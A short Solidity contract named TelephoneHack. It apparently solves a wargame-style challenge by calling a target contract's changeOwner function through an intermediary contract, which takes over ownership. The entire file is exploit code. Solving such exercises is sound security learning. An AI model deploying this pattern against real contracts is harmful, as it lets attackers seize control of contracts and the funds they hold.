//SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface TelephoneContract {
    function changeOwner(address _owner) external;
}
contract TelephoneHack {
    TelephoneContract telephone;

    constructor(address _tele){
        telephone = TelephoneContract(_tele);
    }

    function hack(address addr) public{
        telephone.changeOwner(addr);
    }
}